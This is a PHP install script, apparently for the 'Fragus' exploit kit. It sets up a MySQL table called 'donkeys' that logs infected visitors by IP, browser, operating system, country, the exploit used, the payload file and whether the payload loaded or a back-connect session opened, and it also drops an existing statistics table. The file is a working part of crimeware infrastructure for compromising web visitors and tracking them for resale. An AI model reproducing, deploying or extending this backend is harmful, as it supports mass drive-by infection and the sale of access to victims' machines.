<?php
	include ("secure/config.php");
	if (!($c = mysql_connect($db_host, $db_user, $db_pass))) {
		die("Check host, user or password (.config.php)");
	}
	if (!mysql_select_db($db_name,$c)) {
		die("Check DB name (./cfg/config.php)");
	}

	if (!mysql_query("DROP TABLE IF EXISTS `statistic`;",$c)) die("Check permission for user '".$db_user."'");

	if (!mysql_query("CREATE TABLE `donkeys` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ip` int(10) unsigned NOT NULL DEFAULT '0',
  `seller` int(10) unsigned NOT NULL DEFAULT '0',
  `browser` set('MSIE','FIREFOX','OPERA','CHROME','SAFARI','OTHER') NOT NULL DEFAULT 'OTHER',
  `browser_version` varchar(10) NOT NULL DEFAULT '0',
  `os` set('95','98','ME','2000','2003','XP','VISTA','WIN7','MAC','LINUX','OTHER') NOT NULL DEFAULT 'OTHER',
  `os_version` set('SP1','SP2','SP3','SP4','OTHER') NOT NULL DEFAULT 'OTHER',
  `country` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `file` int(10) unsigned NOT NULL,
  `exploit` tinyint(2) unsigned NOT NULL DEFAULT '0',
  `status` set('NOT','LOAD','BACKCONNECT') NOT NULL DEFAULT 'NOT',
  `time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;",$c)) die("Check permission for user '".$db_user."'");

	die("<html><head><title>Fragus</title><link type='text/css' rel='stylesheet' href='./cfg/style.css'>
</head><body bgcolor='#E5E5E5' text='black'>
<center><img src='./img/logo.gif'><br>
<br>Instalacion Finalizada <br>Elimina install.php</center></body></html>");
?>